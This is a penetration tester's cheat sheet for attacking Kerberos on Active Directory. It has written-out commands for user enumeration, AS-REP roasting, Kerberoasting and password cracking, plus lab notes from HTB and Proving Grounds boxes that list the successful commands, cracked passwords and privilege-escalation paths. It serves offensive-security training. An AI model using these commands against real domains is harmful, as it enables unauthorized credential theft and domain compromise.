# Kerberos - Port 88

## User Enumeration

```bash
kerbrute userenum -d domain.local --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Smaller wordlist for speed
kerbrute userenum -d domain.local --dc $IP /usr/share/seclists/Usernames/Names/names.txt
```

## AS-REP Roasting (No Pre-Auth Required)

```bash
# With known usernames
impacket-GetNPUsers domain.local/ -dc-ip $IP -usersfile users.txt -no-pass -outputfile asrep.txt

# Auto-discover vulnerable users (requires creds)
impacket-GetNPUsers domain.local/user:REDACTED -dc-ip $IP -request -outputfile asrep.txt
```

```bash
# Crack AS-REP hashes
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

See [[AS-REP-Roasting]] for full methodology.

## Kerberoasting

```bash
# Requires valid domain creds
impacket-GetUserSPNs domain.local/user:REDACTED -dc-ip $IP -request -outputfile kerberoast.txt
```

```bash
# Crack TGS hashes
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

See [[Kerberoasting]] for full methodology.

## Nmap

```bash
nmap --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local' -p 88 $IP
```

## Tips

- Kerberos on port 88 = Active Directory domain controller.
- User enumeration does not require credentials and does not trigger lockout.
- AS-REP roasting targets accounts with "Do not require Kerberos preauthentication" set.
- Kerberoasting targets service accounts with SPNs - often have weak passwords.
- Always sync time with DC: `sudo ntpdate $IP`

## See Also

- [[AS-REP-Roasting]] | [[Kerberoasting]] | [[AD-Methodology]] | [[LDAP-389]]

## From Your Boxes

> **Forest** (HTB) - RPC anonymous login enumerated domain users. AS-REP roasting with GetNPUsers found `svc-alfresco` had pre-auth disabled. Cracked hash to `REDACTED`. WinRM access, then BloodHound path to DCSync via Exchange Windows Permissions group abuse.
> - What worked: `for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip TARGET_IP htb/${user}; done` then `hashcat -m 18200`
> - Lesson: AS-REP roasting is free - enumerate all users first (RPC/LDAP), then spray them all through GetNPUsers.

> **Sauna** (HTB) - Kerbrute user enumeration found `fsmith` and others. AS-REP roast returned hash for `fsmith`, cracked to `REDACTED`. WinRM shell, then WinPEAS found AutoLogon creds for `svc_loanmgr` which had DCSync rights.
> - What worked: `kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc TARGET_IP` then `impacket-getNPUsers`
> - Lesson: When you have zero creds, kerbrute userenum + AS-REP roast is your best no-auth Kerberos attack.

> **Active** (HTB) - After finding SVC_TGS creds from GPP password, Kerberoasted the Administrator account. Cracked TGS hash to `Ticketmaster1968`. PSExec for SYSTEM.
> - What worked: `impacket-GetUserSPNs -request -dc-ip TARGET_IP active.htb/SVC_TGS` then `john GetUserSPNs.out --wordlist=rockyou.txt`
> - Lesson: Always Kerberoast once you have any domain creds. Service accounts with SPNs often have weak passwords.

> **Hokkaido** (PG/Windows) - Kerbrute found users, MSSQL IMPERSONATE led to DB creds, then targeted Kerberoast via GenericWrite. Cracked Hazel.Green hash to `haze1988`, then RPC password change of a tier-1 admin for RDP access.
> - What worked: `targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'REDACTED'`
> - Lesson: GenericWrite over a user enables targeted Kerberoasting - set an SPN, request a ticket, crack it.

> **Access** (PG/Windows) - From a webshell foothold, ran Rubeus Kerberoast to find `svc_mssql` service account. Cracked to `trustno1`. Escalated via SeManageVolumePrivilege.
> - What worked: `.\Rubeus.exe kerberoast` from initial shell, then `john` to crack
> - Lesson: Kerberoast from inside too - once you have a shell, Rubeus can find service accounts the network-based tools miss.
